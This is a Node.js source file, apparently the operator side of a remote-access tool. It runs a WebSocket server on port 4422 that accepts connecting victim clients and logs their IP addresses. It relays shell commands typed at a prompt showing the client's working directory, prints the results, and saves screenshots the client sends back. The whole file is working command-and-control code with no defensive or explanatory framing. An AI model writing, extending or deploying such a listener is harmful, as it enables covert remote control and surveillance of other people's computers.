const WebSocket = require('ws');
const readline = require('readline');
const detectCharacterEncoding = require('detect-character-encoding');
var next = "";

const wss = new WebSocket.Server({ port: 4422 });

wss.on('connection', function connection(ws) {
	console.log("[+] Connected to client : " + ws._socket.remoteAddress.replace("::ffff:","") + " !");
	ws.on('message', function incoming(message) {
    
    if(next == "screenshot"){
		next = "";
		var base64Data = message.replace(/^data:image\/png;base64,/, "");

		require("fs").writeFile("screenshots/"+Date.now()+".png", base64Data, 'base64', function(err) {
			console.log(err);
		});
    }
    else if(message.startsWith("hello")){
    	var workingDir = message.substring(message.indexOf("##") + 2, message.lastIndexOf("##"));
    	const rl = readline.createInterface({
			input: process.stdin,
			output: process.stdout
		});
    	rl.question(workingDir+">", (answer) => {
  			ws.send(answer);
			rl.close();
		});
    }else if(message.startsWith("##finish##")){
 		ws.send("#pwd");
    }
    else if(message == "##SCREENSHOT##"){
		next = "screenshot";
    }
    else{
    	console.log(message);
    }

	});

	ws.on('close', function(reasonCode, description) {
		console.log((new Date()) + ' Peer ' + ws.remoteAddress + ' disconnected.');
	});

});